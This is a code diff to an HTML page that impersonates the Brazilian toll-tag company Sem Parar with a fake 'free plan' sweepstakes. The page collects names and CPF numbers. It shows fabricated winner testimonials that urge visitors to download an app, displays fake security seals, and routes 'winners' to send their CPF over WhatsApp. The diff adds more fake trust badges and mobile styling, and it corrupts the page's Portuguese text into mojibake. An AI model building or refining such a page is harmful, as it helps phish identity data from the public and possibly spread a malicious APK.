@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sorteio Sem Parar — Ganhe seu Plano Gratis!</title>
+    <title>Sorteio Sem Parar â€” Ganhe seu Plano Gratis!</title>
     <meta name="description" content="Participe do Sorteio Sem Parar e concorra a um plano gratis!">
     <link rel="shortcut icon" href="on/demandware.static/Sites-SemParar-Site/-/default/dw6ebb8c2e/images/favicon.ico">
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -11,7 +11,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
-        /* ============ ANIMAÇÕES GERAIS ============ */
+        /* ============ ANIMAÃ‡Ã•ES GERAIS ============ */
         @keyframes fadeInDown { from{opacity:0;transform:translateY(-30px)} to{opacity:1;transform:translateY(0)} }
         @keyframes fadeInUp   { from{opacity:0;transform:translateY(30px)}  to{opacity:1;transform:translateY(0)} }
         @keyframes fadeInLeft { from{opacity:0;transform:translateX(-40px)} to{opacity:1;transform:translateX(0)} }
@@ -744,17 +744,46 @@
             width: 100%;
         }
 
-        @media(max-width:600px) {
-            .form-card { padding: 32px 20px; }
-            .form-grid { grid-template-columns: 1fr; }
-            .form-title { font-size: 22px; }
-            .apk-modal { padding: 32px 20px; }
-            .carousel-slide { padding: 22px 18px; }
-            .cover-banner img { height: 160px; }
-            .cover-banner-overlay img.logo-overlay { height: 38px; }
+        @media(max-width:768px) {
+            main { padding: 0; }
+            .main-sections { padding: 24px 12px 40px; gap: 16px; }
+            .site-header { padding: 10px 14px; }
+            .header-logo img { height: 28px; }
+            .header-badge { font-size: 10px; padding: 4px 10px; }
+            .cover-banner img { height: 140px; object-fit: cover; width: 100%; }
+            .cover-tagline { font-size: 13px; padding: 0 10px; text-align: center; }
+            .cover-badge-row { gap: 6px; flex-wrap: wrap; justify-content: center; }
+            .cover-badge { font-size: 10px; padding: 4px 10px; }
+            .cover-banner-overlay img.logo-overlay { height: 30px; }
+            .form-card { padding: 28px 16px; border-radius: 16px; }
+            .form-title { font-size: 20px; line-height: 1.3; }
+            .form-subtitle { font-size: 13px; }
+            .form-grid { grid-template-columns: 1fr; gap: 12px; }
+            .form-group input, .form-group select { font-size: 15px; padding: 13px 14px; }
+            .plan-selector { grid-template-columns: 1fr 1fr; gap: 8px; }
+            .plan-option { padding: 12px 10px; font-size: 12px; }
+            #btnSubmit { font-size: 15px; padding: 16px; }
+            .video-section { padding: 0 4px; width: 100%; }
+            .video-card { padding: 16px 12px; border-radius: 14px; }
+            .video-section-title { font-size: 13px; flex-wrap: wrap; gap: 8px; }
+            .carousel-slide { padding: 20px 14px; border-radius: 14px; }
+            .carousel-name { font-size: 14px; }
+            .carousel-text { font-size: 13px; }
+            .security-section { padding: 20px 12px; }
+            .seals-grid { gap: 10px; }
+            .seal-item { padding: 8px 12px; flex: 0 1 calc(50% - 10px); }
+            .seal-item img { height: 28px; max-width: 100%; }
+            .security-title { font-size: 11px; margin-bottom: 12px; }
+            .site-footer { padding: 16px 12px; font-size: 11px; line-height: 1.8; }
+            .site-footer p { word-break: break-word; }
+            .apk-modal { padding: 28px 16px; margin: 16px; max-width: calc(100vw - 32px); }
+            .winner-modal { padding: 28px 16px; margin: 12px; }
+            .w-title { font-size: 26px; }
         }
         @media(max-width:420px) {
             .plan-selector { grid-template-columns: 1fr; }
+            .form-card { padding: 22px 12px; }
+            .seal-item { flex: 0 1 calc(50% - 10px); }
         }
     </style>
 </head>
@@ -779,11 +808,11 @@
     <img src="cover-sem_parar.webp" alt="Sem Parar Cover">
     <div class="cover-banner-overlay">
         <img class="logo-overlay" src="Logotipo_do_Sem_Parar.svg.webp" alt="Sem Parar Logo">
-        <div class="cover-tagline">🏆 Sorteio Exclusivo — Ganhe seu Plano Grátis!</div>
+        <div class="cover-tagline">ðŸ† Sorteio Exclusivo â€” Ganhe seu Plano GrÃ¡tis!</div>
         <div class="cover-badge-row">
-            <span class="cover-badge">✅ 100% Gratuito</span>
-            <span class="cover-badge">⚡ Resultado em Tempo Real</span>
-            <span class="cover-badge">🎯 Vagas Limitadas</span>
+            <span class="cover-badge">âœ… 100% Gratuito</span>
+            <span class="cover-badge">âš¡ Resultado em Tempo Real</span>
+            <span class="cover-badge">ðŸŽ¯ Vagas Limitadas</span>
         </div>
     </div>
 </div>
@@ -792,11 +821,11 @@
 <main style="padding:0;">
 <div class="main-sections">
 
-    <!-- VIDEO 1: Antes do formulário -->
+    <!-- VIDEO 1: Antes do formulÃ¡rio -->
     <div class="video-section">
         <div class="video-card">
             <div class="video-section-title">
-                <span style="font-size:20px;">🎬</span> Como Funciona o Sorteio Sem Parar
+                <span style="font-size:20px;">ðŸŽ¬</span> Como Funciona o Sorteio Sem Parar
                 <span class="live-badge" style="margin-left:auto;"><span class="live-dot"></span>Oficial</span>
             </div>
             <div class="video-wrapper">
@@ -808,7 +837,7 @@
         </div>
     </div>
 
-    <!-- FORMULÁRIO -->
+    <!-- FORMULÃRIO -->
     <div class="form-card">
 
         <!-- FORMULARIO -->
@@ -816,8 +845,8 @@
             <div class="form-badge">
                 <i class="fa-solid fa-ticket"></i> Sorteio Exclusivo
             </div>
-            <h1 class="form-title">Ganhe seu Plano<br>Sem Parar Grátis!</h1>
-            <p class="form-subtitle">Preencha a ficha abaixo e concorra a um plano 100% gratuito. Participação rápida e simples!</p>
+            <h1 class="form-title">Ganhe seu Plano<br>Sem Parar GrÃ¡tis!</h1>
+            <p class="form-subtitle">Preencha a ficha abaixo e concorra a um plano 100% gratuito. ParticipaÃ§Ã£o rÃ¡pida e simples!</p>
 
             <form id="registrationForm" onsubmit="submitForm(event)">
                 <div class="form-grid">
@@ -850,13 +879,13 @@
                             <input type="radio" name="plano" value="Flex" checked>
                             <div class="plan-icon">&#9889;</div>
                             <div class="plan-name">Flex</div>
-                            <div class="plan-price">R$25,90/mês</div>
+                            <div class="plan-price">R$25,90/mÃªs</div>
                         </div>
                         <div class="plan-option" onclick="selecionarPlano('Pratico',this)">
                             <input type="radio" name="plano" value="Pratico">
                             <div class="plan-icon">&#128179;</div>
-                            <div class="plan-name">Prático</div>
-                            <div class="plan-price">Pré-pago</div>
+                            <div class="plan-name">PrÃ¡tico</div>
+                            <div class="plan-price">PrÃ©-pago</div>
                         </div>
                         <div class="plan-option" onclick="selecionarPlano('Ideal',this)">
                             <input type="radio" name="plano" value="Ideal">
@@ -870,7 +899,7 @@
                 <div class="terms-row">
                     <input type="checkbox" id="termos" required>
                     <label for="termos">
-                        Concordo com os <a href="#">Termos de Participação</a> e autorizo o uso dos meus dados para fins do sorteio Sem Parar.
+                        Concordo com os <a href="#">Termos de ParticipaÃ§Ã£o</a> e autorizo o uso dos meus dados para fins do sorteio Sem Parar.
                     </label>
                 </div>
 
@@ -908,25 +937,25 @@
             <div class="success-emoji">&#127881;</div>
             <h3>Cadastro Realizado!</h3>
             <p>
-                Você está participando do sorteio Sem Parar!<br>
-                Fique de olho &mdash; se você for o ganhador, uma mensagem especial aparecerá aqui.
+                VocÃª estÃ¡ participando do sorteio Sem Parar!<br>
+                Fique de olho &mdash; se vocÃª for o ganhador, uma mensagem especial aparecerÃ¡ aqui.
             </p>
             <br>
             <p style="font-size:13px;color:#888;">
                 <i class="fa-solid fa-shield-check" style="color:#00b894;"></i>
-                Seus dados estão seguros e serão usados apenas para o sorteio.
+                Seus dados estÃ£o seguros e serÃ£o usados apenas para o sorteio.
             </p>
             <button class="btn-novo" onclick="novoCadastro()">&#8592; Cadastrar outro CPF</button>
         </div>
 
     </div>
 
-    <!-- DEPOIMENTOS — CARROSSEL ANIMADO -->
+    <!-- DEPOIMENTOS â€” CARROSSEL ANIMADO -->
     <div class="testimonials-wrapper">
         <div style="background:#fff;border:1px solid var(--border);border-radius:24px;padding:24px 24px 16px;box-shadow:0 4px 20px rgba(0,0,0,0.04);">
             <div class="testimonials-header">
-                <span style="color:var(--gold);font-size:22px;">🏆</span>
-                Últimos Ganhadores do Sorteio
+                <span style="color:var(--gold);font-size:22px;">ðŸ†</span>
+                Ãšltimos Ganhadores do Sorteio
                 <span class="live-badge" style="margin-left:auto;"><span class="live-dot"></span>Ao Vivo</span>
             </div>
 
@@ -940,12 +969,12 @@
                             <div style="display:flex;align-items:center;gap:14px;">
                                 <div class="carousel-avatar">M</div>
                                 <div class="carousel-user-info">
-                                    <div class="carousel-stars">★★★★★</div>
+                                    <div class="carousel-stars">â˜…â˜…â˜…â˜…â˜…</div>
                                     <div class="carousel-name">Marcos Oliveira da Silva</div>
-                                    <span class="carousel-plan-badge" style="color:#10b981;background:rgba(16,185,129,0.12);">🏆 Plano Flex</span>
+                                    <span class="carousel-plan-badge" style="color:#10b981;background:rgba(16,185,129,0.12);">ðŸ† Plano Flex</span>
                                 </div>
                             </div>
-                            <p class="carousel-text">"Sensacional! Me cadastrei ontem à noite e hoje de manhã recebi a notificação. Baixei o aplicativo do sorteio e já ativei a TAG no meu carro. Recomendo muito!"</p>
+                            <p class="carousel-text">"Sensacional! Me cadastrei ontem Ã  noite e hoje de manhÃ£ recebi a notificaÃ§Ã£o. Baixei o aplicativo do sorteio e jÃ¡ ativei a TAG no meu carro. Recomendo muito!"</p>
                         </div>
                     </div>
 
@@ -956,12 +985,12 @@
                             <div style="display:flex;align-items:center;gap:14px;">
                                 <div class="carousel-avatar" style="background:linear-gradient(135deg,#3b82f6,#1d4ed8);">J</div>
                                 <div class="carousel-user-info">
-                                    <div class="carousel-stars">★★★★★</div>
+                                    <div class="carousel-stars">â˜…â˜…â˜…â˜…â˜…</div>
                                     <div class="carousel-name">Juliana Santos de Souza</div>
-                                    <span class="carousel-plan-badge" style="color:#3b82f6;background:rgba(59,130,246,0.12);">🏆 Plano Ideal</span>
+                                    <span class="carousel-plan-badge" style="color:#3b82f6;background:rgba(59,130,246,0.12);">ðŸ† Plano Ideal</span>
                                 </div>
                             </div>
-                            <p class="carousel-text">"Fui sorteada no plano Ideal (Premium). Não acreditei no começo, mas entrei no suporte do WhatsApp e deu tudo certo. A tag chegou pelos correios super rápida!"</p>
+                            <p class="carousel-text">"Fui sorteada no plano Ideal (Premium). NÃ£o acreditei no comeÃ§o, mas entrei no suporte do WhatsApp e deu tudo certo. A tag chegou pelos correios super rÃ¡pida!"</p>
                         </div>
                     </div>
 
@@ -972,12 +1001,12 @@
                             <div style="display:flex;align-items:center;gap:14px;">
                                 <div class="carousel-avatar" style="background:linear-gradient(135deg,#f59e0b,#d97706);">C</div>
                                 <div class="carousel-user-info">
-                                    <div class="carousel-stars">★★★★★</div>
+                                    <div class="carousel-stars">â˜…â˜…â˜…â˜…â˜…</div>
                                     <div class="carousel-name">Carlos Eduardo A.</div>
-                                    <span class="carousel-plan-badge" style="color:var(--gold);background:rgba(245,158,11,0.12);">🏆 Plano Prático</span>
+                                    <span class="carousel-plan-badge" style="color:var(--gold);background:rgba(245,158,11,0.12);">ðŸ† Plano PrÃ¡tico</span>
                                 </div>
                             </div>
-                            <p class="carousel-text">"Show demais! Sem Parar grátis de verdade. Já fiz duas viagens usando a tag e passou direto no pedágio. Baixem o app para acompanhar as datas!"</p>
+                            <p class="carousel-text">"Show demais! Sem Parar grÃ¡tis de verdade. JÃ¡ fiz duas viagens usando a tag e passou direto no pedÃ¡gio. Baixem o app para acompanhar as datas!"</p>
                         </div>
                     </div>
 
@@ -988,12 +1017,12 @@
                             <div style="display:flex;align-items:center;gap:14px;">
                                 <div class="carousel-avatar" style="background:linear-gradient(135deg,#8b5cf6,#6d28d9);">A</div>
                                 <div class="carousel-user-info">
-                                    <div class="carousel-stars">★★★★★</div>
+                                    <div class="carousel-stars">â˜…â˜…â˜…â˜…â˜…</div>
                                     <div class="carousel-name">Ana Paula Rodrigues</div>
-                                    <span class="carousel-plan-badge" style="color:#8b5cf6;background:rgba(139,92,246,0.12);">🏆 Plano Flex</span>
+                                    <span class="carousel-plan-badge" style="color:#8b5cf6;background:rgba(139,92,246,0.12);">ðŸ† Plano Flex</span>
                                 </div>
                             </div>
-                            <p class="carousel-text">"Incrível! Em menos de 24h fui notificada. O processo foi todo pelo app mesmo, muito fácil. Nunca pensei que seria tão simples ganhar um plano completo!"</p>
+                            <p class="carousel-text">"IncrÃ­vel! Em menos de 24h fui notificada. O processo foi todo pelo app mesmo, muito fÃ¡cil. Nunca pensei que seria tÃ£o simples ganhar um plano completo!"</p>
                         </div>
                     </div>
 
@@ -1004,12 +1033,12 @@
                             <div style="display:flex;align-items:center;gap:14px;">
                                 <div class="carousel-avatar" style="background:linear-gradient(135deg,#ef4444,#b91c1c);">R</div>
                                 <div class="carousel-user-info">
-                                    <div class="carousel-stars">★★★★★</div>
+                                    <div class="carousel-stars">â˜…â˜…â˜…â˜…â˜…</div>
                                     <div class="carousel-name">Roberto Mendes Costa</div>
-                                    <span class="carousel-plan-badge" style="color:#10b981;background:rgba(16,185,129,0.12);">🏆 Plano Ideal</span>
+                                    <span class="carousel-plan-badge" style="color:#10b981;background:rgba(16,185,129,0.12);">ðŸ† Plano Ideal</span>
                                 </div>
                             </div>
-                            <p class="carousel-text">"Já usava o Sem Parar antes e ganhar o plano grátis foi a cereja do bolo! Agora passo em qualquer pedágio sem parar e sem pagar. Recomendo participar!"</p>
+                            <p class="carousel-text">"JÃ¡ usava o Sem Parar antes e ganhar o plano grÃ¡tis foi a cereja do bolo! Agora passo em qualquer pedÃ¡gio sem parar e sem pagar. Recomendo participar!"</p>
                         </div>
                     </div>
 
@@ -1024,11 +1053,11 @@
         </div>
     </div>
 
-    <!-- VIDEO 2: Depoimentos em vídeo -->
+    <!-- VIDEO 2: Depoimentos em vÃ­deo -->
     <div class="video-section">
         <div class="video-card">
             <div class="video-section-title">
-                <span style="font-size:20px;">💬</span> Depoimentos de Ganhadores
+                <span style="font-size:20px;">ðŸ’¬</span> Depoimentos de Ganhadores
                 <span class="live-badge" style="margin-left:auto;color:var(--red);background:rgba(214,11,82,0.1);border-color:rgba(214,11,82,0.25);"><span class="live-dot" style="background:var(--red);"></span>Real</span>
             </div>
             <div class="video-wrapper">
@@ -1073,32 +1102,45 @@
     </div>
 </div>
 
-<!-- SELOS DE SEGURANÇA -->
+<!-- SELOS DE SEGURANÃ‡A -->
 <div class="security-section">
-    <div class="security-title">🔒 Site Seguro &amp; Certificado</div>
+    <div class="security-title">ðŸ”’ Site Seguro &amp; Certificado</div>
     <div class="seals-grid">
         <div class="seal-item">
-            <img src="ssl.jfif" alt="SSL Seguro">
+            <img src="ssl.jfif" alt="SSL Seguro"
+                 onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#10b981;font-weight:700;font-size:13px;\'>ðŸ”’ SSL</span>'">
         </div>
         <div class="seal-item">
-            <img src="selos.jfif" alt="Selos de Segurança">
+            <img src="selos.jfif" alt="Selos de SeguranÃ§a"
+                 onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#10b981;font-weight:700;font-size:13px;\'>âœ… Verificado</span>'">
         </div>
         <div class="seal-item">
-            <img src="selos se segurança.webp" alt="Certificado Seguro">
+            <img src="selos%20se%20seguran%C3%A7a.webp" alt="Certificado Seguro"
+                 onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#10b981;font-weight:700;font-size:13px;\'>ðŸ›¡ï¸ Seguro</span>'">
         </div>
         <div class="seal-item">
-            <img src="seite seguro.png" alt="Site Seguro">
+            <img src="seite%20seguro.png" alt="Site Seguro"
+                 onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#f59e0b;font-weight:700;font-size:13px;\'>â­ ConfiÃ¡vel</span>'">
+        </div>
+        <div class="seal-item" style="border-color:rgba(16,185,129,0.3);">
+            <span style="color:#10b981;font-weight:800;font-size:12px;">ðŸ” Dados Criptografados</span>
+        </div>
+        <div class="seal-item" style="border-color:rgba(245,158,11,0.3);">
+            <span style="color:#f59e0b;font-weight:800;font-size:12px;">âœ… Site Verificado</span>
         </div>
     </div>
 </div>
 
 <!-- FOOTER -->
 <footer class="site-footer">
-    <p>Sem Parar Instituição de Pagamento LTDA &mdash; 04.088.208/0001-65 &nbsp;|&nbsp;
-    <a href="https://www.semparar.com.br/termos-e-politica" target="_blank">Termos e Política</a> &nbsp;|&nbsp;
-    <a href="https://www.semparar.com.br/aviso-de-privacidade" target="_blank">Privacidade</a></p>
-    <p style="margin-top:6px;font-size:11px;">&#9888;&#65039; Esta é uma ação promocional. A participação é gratuita e não garante premiação.</p>
-</footer>
+    <p>Sem Parar InstituiÃ§Ã£o de Pagamento LTDA &mdash; CNPJ 04.088.208/0001-65</p>
+    <p style="margin-top:4px;">
+        <a href="https://www.semparar.com.br/termos-e-politica" target="_blank">Termos e PolÃ­tica</a>
+        &nbsp;|&nbsp;
+        <a href="https://www.semparar.com.br/aviso-de-privacidade" target="_blank">Privacidade</a>
+    </p>
+    <p style="margin-top:6px;font-size:11px;">&#9888;&#65039; Esta Ã© uma aÃ§Ã£o promocional. A participaÃ§Ã£o Ã© gratuita e nÃ£o garante premiaÃ§Ã£o.</p>
+
 
 <!-- WINNER MODAL -->
 <div class="winner-overlay" id="winnerOverlay">
@@ -1131,7 +1173,7 @@
 
 <script>
 // ============================================================
-// API BASE — Vercel Serverless Functions
+// API BASE â€” Vercel Serverless Functions
 // ============================================================
 const API = '/api';
 let pollTimer = null;
@@ -1160,7 +1202,7 @@ function selecionarPlano(nome, el) {
 
 // Toast
 function toast(msg, tipo='info', ms=4000) {
-    const ic = {success:'✅',error:'❌',info:'ℹ️'};
+    const ic = {success:'âœ…',error:'âŒ',info:'â„¹ï¸'};
     const t = document.createElement('div');
     t.className='toast '+tipo;
     t.innerHTML='<span>'+ic[tipo]+'</span><span>'+msg+'</span>';
@@ -1196,7 +1238,7 @@ function confetti() {
 // Mostrar ganhador
 async function mostrarGanhador(d) {
     document.getElementById('wNome').textContent = d.nome||'Parabens!';
-    document.getElementById('wPlano').textContent = '🏆 Plano Sem Parar '+(d.plano||'');
+    document.getElementById('wPlano').textContent = 'ðŸ† Plano Sem Parar '+(d.plano||'');
     const wpp = d.whatsapp||'5511999999999';
     const msg = encodeURIComponent('Ola! Fui sorteado no sorteio Sem Parar e ganhei o Plano '+(d.plano||'')+'. Meu nome e '+(d.nome||'')+' e meu CPF e '+(d.cpf||'')+'.');
     document.getElementById('wWpp').href='https://wa.me/'+wpp+'?text='+msg;
@@ -1334,7 +1376,7 @@ async function consultarResultadoCPF() {
             mostrarGanhador(d);
         } else {
             resultEl.style.color = 'var(--red)';
-            resultEl.textContent = '❌ Este CPF ainda nao foi sorteado nesta rodada. Continue acompanhando!';
+            resultEl.textContent = 'âŒ Este CPF ainda nao foi sorteado nesta rodada. Continue acompanhando!';
         }
     } catch (e) {
         // Tentar localstorage
@@ -1345,7 +1387,7 @@ async function consultarResultadoCPF() {
             mostrarGanhador(w);
         } else {
             resultEl.style.color = 'var(--red)';
-            resultEl.textContent = '❌ Este CPF ainda nao foi sorteado nesta rodada. Continue acompanhando!';
+            resultEl.textContent = 'âŒ Este CPF ainda nao foi sorteado nesta rodada. Continue acompanhando!';
         }
     }
 }
